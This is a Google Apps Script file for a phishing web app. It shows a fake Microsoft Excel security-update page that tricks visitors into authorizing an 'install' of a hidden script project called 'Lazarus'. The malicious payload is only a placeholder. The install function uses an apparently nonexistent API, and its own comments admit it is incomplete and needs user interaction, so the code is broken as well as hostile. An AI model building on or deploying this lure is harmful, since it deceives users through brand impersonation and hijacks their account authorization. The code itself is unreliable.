// Save this as a Google Apps Script web app (deploy as "Execute as me" with "Anyone" access)
function doGet() {
  const html = `
  <html>
  <head><title>Install Security Update</title></head>
  <body>
    <h2>Microsoft Excel Security Update Required</h2>
    <p>To view this document correctly, you must install the latest security add‑on.</p>
    <button onclick="install()">Click Here to Install</button>
    <script>
      function install() {
        google.script.run.withSuccessHandler(function() {
          window.location.href = "https://docs.google.com/spreadsheets/create";
        }).installScript();
      }
    </script>
  </body>
  </html>
  `;
  return HtmlService.createHtmlOutput(html);
}

function installScript() {
  // This function runs on the server with the user's authorization
  const scriptContent = `YOUR FULL GOOGLE APPS SCRIPT PAYLOAD HERE (the malicious code)`;
  const project = ScriptApp.newProject("Lazarus");
  const scriptFile = project.createFile("Code.gs", scriptContent);
  // Attach it to the current spreadsheet? Not directly possible without user opening.
  // Instead, create a new spreadsheet and add the script.
  const newSheet = SpreadsheetApp.create("Lazarus_Update");
  const url = newSheet.getUrl();
  // Open the script editor for that sheet – but still requires user to open.
  // This is complex and still requires user interaction.
}
